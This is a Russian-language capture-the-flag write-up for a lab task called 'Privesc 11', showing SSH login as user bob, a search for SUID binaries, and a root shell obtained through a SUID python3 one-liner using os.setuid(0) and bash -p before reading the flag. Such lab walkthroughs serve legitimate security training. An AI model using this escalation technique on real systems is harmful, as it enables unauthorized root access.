# Privesc 11

## Описание

Попробуй зайти от пользователя root и прочитать флаг. Пароль от пользователя bob - bob123.

```
ssh bob@<domain> -p <port>
```

## Решение

Подключимся к системе как пользователь `bob` с паролем `bob123`.
```bash
ssh bob@<domain> -p <port>
```

Найдем все файлы с SUID-битом. Для этого используется команда `find`.
```bash
find / -perm -u=s -type f 2>/dev/null
```

В списке можно увидеть `/usr/bin/python3`.

Теперь, когда мы знаем, что `python3` будет запускаться с правами `root`, мы можем использовать его для получения root-шелла.

Выполним следующую команду:
```bash
python3 -c "import os; os.setuid(0); os.system('/bin/bash -p')"
```

Флаг `-p` критически важен, так как он заставляет `bash` не сбрасывать привилегии до вашего пользователя

`os.setuid(0)` так же важен, так как он устанавливает идентификатор пользователя (UID) текущего процесса. Передача `0` означает установку UID пользователя `root`. Это позволяет процессу, запущенному от имени обычного пользователя, получить права суперпользователя, если у исполняемого файла установлен SUID-бит.

После выполнения этой команды вы получите шелл с правами `root`.

Получив права `root`, прочитаем флаг.
```bash
cat /root/flag.txt
```
